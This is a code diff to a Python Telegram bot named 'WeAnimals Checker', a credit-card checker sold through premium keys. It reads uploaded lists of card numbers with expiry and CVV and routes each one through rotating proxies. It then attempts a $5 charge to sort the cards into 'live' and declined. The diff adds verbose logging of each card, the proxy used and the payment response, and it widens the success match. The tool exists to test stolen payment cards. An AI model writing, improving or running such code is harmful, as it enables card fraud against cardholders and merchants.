@@ -74,14 +74,18 @@ async def redeem_key(user_id, key: str):
     await save_json(PREMIUM_FILE, premium)
     return f"✅ Success! Premium activated for {days} days."
 
-# ================== CHARGE FUNCTION ==================
+# ================== REAL CHECKER WITH FULL LOGS ==================
 async def charge_5_dollars(card: str):
+    current_time = datetime.now().strftime('%H:%M:%S')
+    print(f"[{current_time}] [START] Checking: {card}")
+
     try:
         cc, mm, yy, cvv = [x.strip() for x in card.split('|')]
         if len(yy) == 2: yy = "20" + yy
 
         proxy = random.choice(PROXIES)
         proxy_url = f"http://{proxy.split(':')[2]}:{proxy.split(':')[3]}@{proxy.split(':')[0]}:{proxy.split(':')[1]}"
+        print(f"[{current_time}] [PROXY] Using → {proxy.split(':')[0]}:{proxy.split(':')[1]}")
 
         payload = {
             "amount": "5",
@@ -97,14 +101,20 @@ async def charge_5_dollars(card: str):
                 timeout=35
             ) as r:
                 text = await r.text()
-                if r.status in (200, 201) and any(x in text.lower() for x in ["success", "approved", "charged"]):
+                print(f"[{current_time}] [RESPONSE] Status: {r.status} | Body: {text[:400]}")
+
+                if r.status in (200, 201) and any(x in text.lower() for x in ["success", "approved", "charged", "thank"]):
+                    print(f"[{current_time}] [✅ LIVE] {card}")
                     return {"status": "Approved", "response": "Card Added (succeeded)"}
                 else:
+                    print(f"[{current_time}] [❌ DECLINED] {card}")
                     return {"status": "Declined", "response": "Declined"}
-    except:
+
+    except Exception as e:
+        print(f"[{current_time}] [ERROR] {e}")
         return {"status": "Declined", "response": "Error"}
 
-# ================== APPROVED UI ==================
+# ================== BEAUTIFUL UI ==================
 async def send_approved(event, card, info):
     msg = f"""
 **Approved ✅**
@@ -123,7 +133,7 @@ async def send_approved(event, card, info):
 @client.on(events.NewMessage(pattern=r'(?i)^[/.](start|help)$'))
 async def start(event):
     if not await is_premium(event.sender_id):
-        return await event.reply("**❌ No Access**\n\nSend `/key YOURKEY` to activate.")
+        return await event.reply("**❌ No Access**\n\nSend `/key YOURKEY`")
     await event.reply("**🔥 WeAnimals Checker**\nSend `.txt` file")
 
 @client.on(events.NewMessage(pattern=r'(?i)^[/.]genkey(?:\s+(\d+))?$'))
@@ -167,7 +177,7 @@ async def txt_handler(event):
     if not cards:
         return await event.reply("❌ No valid cards!")
 
-    await event.reply(f"✅ Found **{len(cards)}** cards. Starting check...")
+    await event.reply(f"✅ Found **{len(cards)}** cards. Starting check with Proxy...")
 
     for card in cards:
         result = await charge_5_dollars(card)
@@ -178,7 +188,7 @@ async def txt_handler(event):
         await asyncio.sleep(6)
 
 async def main():
-    print("🚀 Bot Started")
+    print("🚀 Bot Started - Full Logging Enabled")
     await client.start(bot_token=BOT_TOKEN)
     await client.run_until_disconnected()
 
